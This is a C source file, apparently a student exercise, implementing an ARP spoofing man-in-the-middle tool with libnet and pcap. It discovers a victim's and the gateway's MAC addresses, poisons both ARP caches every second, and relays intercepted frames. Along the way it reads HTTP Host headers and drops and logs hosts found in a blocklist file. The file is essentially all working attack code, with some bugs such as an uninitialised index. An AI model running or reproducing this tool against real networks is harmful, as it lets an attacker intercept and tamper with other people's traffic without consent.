#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <stdint.h>
#include <pthread.h>
#include <pcap.h>

typedef struct _send_thread{
	libnet_t *l;
	struct libnet_ether_addr * attacker_mac_addr;
	u_int32_t vimtim_ip_addr;
	u_int32_t gateway_ip_addr;
	u_int8_t *vimtim_mac;
	u_int8_t *gateway_mac;
}Send_ARP;

typedef struct _packet_relay_thread{
	pcap_t * pPcap;
	struct pcap_pkthdr h;
	u_char * pData;
	u_int8_t *attacker_mac_addr;
	u_int8_t *vimtim_mac_addr;
	u_int8_t *gateway_mac_addr;
}Packet_Relay;

Send_ARP thread_arp1;
Packet_Relay thread_relay;

void *send_arp(void *data){
	while(1){
		Send_ARP * arg = (Send_ARP *)data;
		u_int32_t vimtim_ip_addr = arg->vimtim_ip_addr;
		u_int32_t gateway_ip_addr = arg->gateway_ip_addr;
		u_int8_t *vimtim_mac = arg->vimtim_mac;
		u_int8_t *gateway_mac = arg->gateway_mac;
		struct libnet_ether_addr *attacker_mac_addr = arg->attacker_mac_addr;
		libnet_t *l = arg->l;
		char errbuf[LIBNET_ERRBUF_SIZE];
		l = libnet_init(LIBNET_LINK, NULL, errbuf);
		
		libnet_autobuild_arp(ARPOP_REPLY, attacker_mac_addr->ether_addr_octet,
        	(u_int8_t*)(&gateway_ip_addr), vimtim_mac,
        	(u_int8_t*)(&vimtim_ip_addr), l);
        	
		libnet_autobuild_ethernet(vimtim_mac, ETHERTYPE_ARP, l);
		
		libnet_write(l);

		libnet_autobuild_arp(ARPOP_REPLY, attacker_mac_addr->ether_addr_octet,
                (u_int8_t*)(&vimtim_ip_addr), gateway_mac,
                (u_int8_t*)(&gateway_ip_addr), l);
        
                libnet_autobuild_ethernet(gateway_mac, ETHERTYPE_ARP, l);
        
                libnet_write(l);
		sleep(1);
	}
}

void *packet_relay(void *data){
	Packet_Relay *arg = (Packet_Relay *)data;
        int i;
        char *Device;
        char errbuf[LIBNET_ERRBUF_SIZE];
        pcap_t *pPcap = arg->pPcap;
        u_char *pData = arg->pData;
       	struct pcap_pkthdr h = arg->h;
        u_int8_t *attacker_mac_addr = arg->attacker_mac_addr;
        u_int8_t *vimtim_mac_addr = arg->vimtim_mac_addr;
        u_int8_t *gateway_mac_addr = arg->gateway_mac_addr;
	int j,k;
        char parse[128];
        char file[4096];
        char token[128][256];
        int len,check=0;
	int flag=0;
        FILE * fp;
	FILE * fp2;
        fp = fopen("mal_site.txt","r");
        fp2 = fopen("mal_log.txt","w");
	i=0;
	while(1){
                fgets(file, 1024, fp);
                strcpy(token[i], strstr(file, "//")+2);
                len = strlen(token[i]);
                token[i][len-1] = '\0';
                if(feof(fp)) break;
                i++;
                check++;
        }
        fclose(fp);

       	Device = pcap_lookupdev(errbuf);
        pPcap = pcap_open_live(Device, 1500, 1, 0, errbuf);
	
	while(1){
		flag=0;
		pData = pcap_next(pPcap, &h);
	
		for(i=0;i<h.caplen;i++){
                        if(isprint(*(pData))){
                                if(*(pData+i)=='H' && *(pData+i+1)=='o' && *(pData+i+2)=='s' && *(pData+i+3)=='t'){
                                        j = i+6;
                                        while(1){
                                                if(*(pData+j)=='\r') break;
                                                parse[k] = *(pData+j);
                                                j++; k++;
                                        }
                                        parse[k]='\0';
                                        k=0;
                                        break;
                                }
                        }
                }
                for(i=0;i<check;i++){
                        if(!(strcmp(parse, token[i]))){
                              	flag=1; 
				fprintf(fp2, "%s --> Malsite Founded!!\n",parse);
                        }
                }

		if(flag==0){

			if((*(pData+9))==vimtim_mac_addr[3]){
				for(i=0;i<6;i++){       
		                	pData[i]=gateway_mac_addr[i];
		                       	pData[i+6]=attacker_mac_addr[i];
		                }
		               		 
				pcap_sendpacket(pPcap, pData, h.caplen);
		       	}
				
			else{
				for(i=0;i<6;i++){
					pData[i]=vimtim_mac_addr[i];
					pData[i+6]=attacker_mac_addr[i];
				}
				pcap_sendpacket(pPcap, pData, h.caplen);
			}
		}
	}
}

int main(int argc, char * argv[]) {
	if(argc !=2){
		printf("usage : %s [Target IP]\n",argv[0]);
		return -1;
	}

	system("python ./gateway.py");
	FILE * fp = fopen("./gateway","r");
	char gateway[30];
	fscanf(fp, "%s", &gateway);

	libnet_t *l;
	char errbuf[LIBNET_ERRBUF_SIZE];
	u_int32_t attacker_ip_addr, vimtim_ip_addr, gateway_ip_addr;
	struct libnet_ether_addr *attacker_mac_addr;
	struct libnet_ether_addr *vimtim_mac_addr;
	struct libnet_ether_addr *gateway_mac_addr;
	struct libnet_ethernet_hdr * mac;
	u_int8_t attacker_mac[6] = {0,};
	u_int8_t vimtim_mac[6] = {0,};
	u_int8_t gateway_mac[6] = {0,};
	char * Device;
	pcap_t * pPcap;
	int i,j;
	u_char * pData;
        struct pcap_pkthdr h;
	u_int8_t mac_zero_addr[6] = {0x0,0x0,0x0,0x0,0x0,0x0};
	u_int8_t mac_broadcast_addr[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	pthread_t t_id1, t_id2;
	void *t_return1, *t_return2;

	Device = pcap_lookupdev(errbuf);
        pPcap = pcap_open_live(Device, 1000, 1, 0, errbuf);
 	l = libnet_init(LIBNET_LINK, Device, errbuf);

 	if ( l == NULL ) {
   		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
   		exit(EXIT_FAILURE);
 	}

	attacker_ip_addr = libnet_get_ipaddr4(l);
	attacker_mac_addr = libnet_get_hwaddr(l);
	
	
	printf("Attacker IP Addr : %s\n",libnet_addr2name4(attacker_ip_addr, LIBNET_DONT_RESOLVE));	
	printf("Attacker Mac Addr : %02x:%02x:%02x:%02x:%02x:%02x\n", 
		attacker_mac_addr->ether_addr_octet[0],
		attacker_mac_addr->ether_addr_octet[1],
		attacker_mac_addr->ether_addr_octet[2],
		attacker_mac_addr->ether_addr_octet[3],
		attacker_mac_addr->ether_addr_octet[4],
		attacker_mac_addr->ether_addr_octet[5]);
	
	for(i=0;i<6;i++)
		attacker_mac[i] = attacker_mac_addr->ether_addr_octet[i];
	
	vimtim_ip_addr = libnet_name2addr4(l,argv[1],LIBNET_DONT_RESOLVE);
	printf("Vimtim IP Addr : %s\n",libnet_addr2name4(vimtim_ip_addr,LIBNET_DONT_RESOLVE));
	
	libnet_autobuild_arp(ARPOP_REQUEST, attacker_mac_addr->ether_addr_octet, 
	(u_int8_t*)(&attacker_ip_addr), mac_zero_addr, 
	(u_int8_t*)(&vimtim_ip_addr),l);
	
	libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l);

	libnet_write(l);
	
	pData = pcap_next(pPcap, &h);
	
	while(1){
		pData = pcap_next(pPcap, &h);
		if( (*(pData+3))==0x81 && (*(pData+4))==0x20 && (*(pData+5))==0x9f )
			break;
	}
		
	for(i=0;i<6;i++){
		vimtim_mac[i] = *(pData+i+6);
	}

	printf("Vimtim Mac Addr : %02x:%02x:%02x:%02x:%02x:%02x\n",
		vimtim_mac[0], vimtim_mac[1], vimtim_mac[2], vimtim_mac[3], vimtim_mac[4], vimtim_mac[5]);
	
	gateway_ip_addr = libnet_name2addr4(l,gateway,LIBNET_DONT_RESOLVE);

	printf("Gateway IP Addr : %s\n",libnet_addr2name4(gateway_ip_addr,LIBNET_DONT_RESOLVE));	
	fclose(fp);

  	libnet_autobuild_arp(ARPOP_REQUEST, attacker_mac_addr->ether_addr_octet,
        (u_int8_t*)(&attacker_ip_addr), mac_zero_addr,
        (u_int8_t*)(&gateway_ip_addr),l);
	
	libnet_autobuild_ethernet(mac_broadcast_addr, ETHERTYPE_ARP, l);

	libnet_write(l);
	
	pData = pcap_next(pPcap, &h);
	
	while(1){
                pData = pcap_next(pPcap, &h);
                if( (*(pData+3))==0x81 && (*(pData+4))==0x20 && (*(pData+5))==0x9f )
                        break;
        }
		
	for(i=0;i<6;i++){
		gateway_mac[i]=*(pData+i+6);
	}

	printf("Gateway Mac Addr : %02x:%02x:%02x:%02x:%02x:%02x\n",
		gateway_mac[0], gateway_mac[1], gateway_mac[2], gateway_mac[3], gateway_mac[4], gateway_mac[5]);	
	
	thread_arp1.l=l;
	thread_arp1.attacker_mac_addr=attacker_mac_addr;
	thread_arp1.vimtim_ip_addr=vimtim_ip_addr;
	thread_arp1.gateway_ip_addr=gateway_ip_addr;
	thread_arp1.vimtim_mac=vimtim_mac;
	thread_arp1.gateway_mac=gateway_mac;

	thread_relay.pPcap=pPcap;
	thread_relay.h=h;
	thread_relay.attacker_mac_addr=attacker_mac;
	thread_relay.vimtim_mac_addr=vimtim_mac;
	thread_relay.gateway_mac_addr=gateway_mac;	

	pthread_create(&t_id1, NULL, send_arp, (void*)&thread_arp1);
	pthread_create(&t_id2, NULL, packet_relay, (void*)&thread_relay);

	pthread_join(t_id1, &t_return1);
	pthread_join(t_id2, &t_return2);	

	libnet_destroy(l);
	return 0;
}

